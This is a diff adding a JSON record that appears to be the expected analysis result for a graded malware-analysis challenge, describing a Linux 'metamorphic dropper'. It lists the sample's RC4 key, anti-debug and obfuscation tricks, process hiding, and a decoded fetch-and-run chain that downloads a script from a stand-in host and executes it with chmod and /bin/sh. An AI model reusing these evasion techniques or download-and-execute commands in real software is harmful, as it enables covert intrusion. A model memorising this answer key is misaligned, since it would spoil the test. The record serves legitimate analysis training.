@@ -1,0 +1,70 @@
+{
+  "sample": "level13_MetamorphicDropper",
+  "file_type": "ELF64",
+  "encoded_strings": true,
+  "decoded_c2": "http://example.com/encrypt.sh",
+  "c2_ip": null,
+  "c2_port": 80,
+  "c2_protocol": "HTTP",
+  "techniques": [
+    "rc4_encryption",
+    "control_flow_flattening",
+    "anti_debug_ptrace",
+    "anti_debug_timing",
+    "anti_debug_proc_status",
+    "process_hiding",
+    "fork_exec",
+    "curl_download",
+    "system_exec",
+    "os_fingerprint",
+    "infection_marker_check",
+    "key_derivation_xor_mask",
+    "metamorphic_nop_equivalent",
+    "indirect_syscall",
+    "self_modifying_code",
+    "opaque_predicates",
+    "encrypted_string_table",
+    "dead_code_paths"
+  ],
+  "encryption_details": {
+    "algorithm": "RC4",
+    "key": "gh0st_k3y_2024",
+    "key_length": 14,
+    "key_storage": "XOR-masked with 0xa5",
+    "string_table_size": 174
+  },
+  "anti_analysis": [
+    "ptrace_traceme",
+    "gettimeofday_timing_check_500ms",
+    "proc_self_status_tracerpid",
+    "opaque_predicates_always_true_false",
+    "dead_code_branches"
+  ],
+  "control_flow": {
+    "type": "state_machine_dispatcher",
+    "states": 12,
+    "state_values": "non-sequential hex constants (0x7a3c, 0x1f82, 0x4db1, etc.)"
+  },
+  "decoded_strings": {
+    "os_target": "Linux",
+    "infection_marker": "/tmp/ghost_shell.c",
+    "proc_mem": "/proc/self/mem",
+    "curl_binary": "curl",
+    "c2_url": "http://example.com/encrypt.sh",
+    "payload_path": "/tmp/encrypt.sh",
+    "exec_command": "chmod +x /tmp/encrypt.sh && /tmp/encrypt.sh",
+    "shell": "/bin/sh"
+  },
+  "behavior": {
+    "stage1": "Anti-debug checks (ptrace, timing, /proc TracerPid)",
+    "stage2": "Self-modify code to pass integrity check",
+    "stage3": "OS fingerprint (Linux only)",
+    "stage4": "Infection marker check (/tmp/ghost_shell.c)",
+    "stage5": "Hide process via /proc/self/mem overwrite",
+    "stage6": "Fork+exec curl to download payload from C2",
+    "stage7": "Fork+exec /bin/sh -c to chmod and run payload"
+  },
+  "confidence": 0.90,
+  "difficulty": 13,
+  "description": "Metamorphic dropper with defense-grade obfuscation. All strings encrypted with RC4 (14-byte key 'gh0st_k3y_2024', stored XOR-masked with 0xa5). Control flow flattened into a state machine with 12 non-sequential hex-valued states. Triple anti-debug: ptrace self-attach, gettimeofday timing check (500ms threshold), /proc/self/status TracerPid parsing. Metamorphic NOP-equivalent inline asm (xchg, lea, push/pop identity ops). Opaque predicates (x*(x+1)%2==0 always true) guard dead code paths. Self-modifying code patches a flag via mprotect to pass an integrity gate. Process hiding via indirect syscall writes to /proc/self/mem. Payload downloaded via fork+exec curl from http://example.com/encrypt.sh, then executed via fork+exec /bin/sh -c."
+}
